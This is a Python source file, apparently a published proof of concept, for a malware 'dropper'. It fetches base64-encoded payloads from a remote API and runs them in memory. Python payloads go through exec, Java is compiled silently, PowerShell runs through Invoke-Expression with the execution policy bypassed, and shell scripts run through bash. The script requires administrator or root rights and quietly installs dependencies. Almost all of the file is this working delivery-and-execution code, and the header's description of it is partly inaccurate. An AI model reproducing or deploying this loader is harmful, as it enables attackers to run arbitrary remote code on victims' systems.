##############################################################################
# Offline Py-JSON-Dropper - dropper - Python Script
# Description: A POC for JSON dropper(drop by fetching API JSON). It will ask for malware path and create a new json file with encode malware bodies, 
# for final it will execute the malware based on the extention(ps1/sh/java/python) using in memory execution.
# Author: Dor Dahan
# License: MIT (See details in the LICENSE file or at the end of this script)
##############################################################################

import base64
import ctypes
import os
import pip
import platform
import subprocess
import tempfile

# Check the operating system
OS = platform.system()
WIN = False
LIN = False
if OS == "Windows":
    WIN = True
elif OS == "Linux":
    LIN = True
    
# The API url you used for fetch the json malware
URL = ""

# The pip packages to install
packages = ["requests"]

def install_package(package_name):
    """
    Will install the packages requirements for the script to run.
    :param package_name: The package name.
    :return: None
    """
    while True:
        try:
            pip.main(["install", package_name])
            break
        except ImportError:
            continue
        except Exception:
            continue

def find_main_methods(java_code):
    lines = java_code.splitlines()
    in_main_method = False
    class_name = None
    for line in lines:
        # Remove leading/trailing spaces and ignore comments
        line = line.strip()
        if not line.startswith("//"):
            # Check if the line contains the main method declaration
            if "public static void main(String[] args)" in line:
                in_main_method = True
            # Check if a class declaration is found
            if line.startswith("public class "):
                class_name = line.split()[2]  # Extract the class name
            # Check if the class contains the main method
            if in_main_method and class_name:
                return class_name
            return None

def execute_process(script_content: bytes, extension: str, malware: str) -> None:
    """
    Will check the OS and will act as need to the OS.
    :param script_content: The encoded binary of the malware
    :param extension: The file extension.
    :param malware: The encoded string of the malware.
    :return:
    """
    # Check which extension the malware use
    if extension.lower() == "py":
        # Run a python script
        exec(script_content.decode("utf-8"))
    elif extension.lower() == "java":
        # # Take note that if the target doesn't have a JDK this option will not work
        # Finding the main function of the java code
        class_name = find_main_methods(script_content.decode("utf-8"))
        if class_name is None:
            exit()
        # Create a new directory for java compile
        with tempfile.TemporaryDirectory() as temp_dir:
            # Write the Java code to a temporary file for compilation
            java_file_path = temp_dir + '/' + class_name + '.java'
            with open(java_file_path, 'w') as java_file:
                java_file.write(script_content.decode("utf-8"))
            # Compile and run the Java code, sending output to /dev/null
            with open(os.devnull, 'w') as null:
                compile_command = ["javac", "-d", temp_dir, java_file_path]
                subprocess.run(compile_command, check=True, stdout=null, stderr=null)
                run_command = ["java", "-cp", temp_dir, class_name]
                subprocess.run(run_command, text=True, check=True, stdout=null, stderr=null)
    else:
        if WIN:
            # If the system is Windows
            if extension.lower() == "ps1":
                # Run a powershell script from the IEX
                powershell_command = ['powershell', '-ExecutionPolicy', 'Bypass', '-Command',
                                      f"$script = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{malware}')); Invoke-Expression $script"]
                execution(powershell_command)
        elif LIN:
            # If the system is Linux
            if extension.lower() == "sh":
                # Run the bash script using one-liner command
                final_command = ["/bin/bash", "-c", script_content.decode("utf-8")]
                execution(final_command)

def execution(command: str) -> None:
    """
    Will execute the command using Shell
    :param command: The command to execute
    """
    try:
        if WIN:
            subprocess.run(command, shell=False, check=True)
        elif LIN:
            subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    except subprocess.CalledProcessError:
        return

def main():
    # Getting the response from the api server
    response = requests.get(url=URL).json()

    # Looping throw the keys in the json format
    for index, key in enumerate(response):

        # Create new file name via the index and file name
        filename = response[key]["fullName"].split(".")
        extension = filename[-1]

        # Fetch the body of the malware and decode it
        malware = response[key]["body"]
        encode = malware.encode("utf-8")
        decoded = base64.b64decode(encode)
        
        # send to the execution process that will execute the script via in memory execution.
        execute_process(decoded, extension, malware)

def win_admin():
    """
    Check if the user is administrator or regular user (Windows system only)
    :return: True/False
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except ctypes.WinError:
        return False

def lin_user():
    """
    Check if the user is root or regular user (Linux system only)
    :return: True/False.
    """
    from getpass import getuser
    if getuser() == "root":
        return True
    else:
        return False

if __name__ == '__main__':
    # Install packages
    for package in packages:
        install_package(package)
    # Administrator/root check
    if LIN:
        if not lin_user():
            print("Need root permissions")
            exit(1)
    elif WIN:
        if not win_admin():
            print("Need administrator permissions")
            exit(1)
    import requests
    # Start the script
    main()

# License Information
# This script is open-source and released under the MIT License.
# MIT License
# Copyright (c) 2023 Dor Dahan
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# For more details, see the LICENSE file in the root directory of this repository
# or visit https://github.com/D0rDa4aN919/Py-JSON-Dropper.
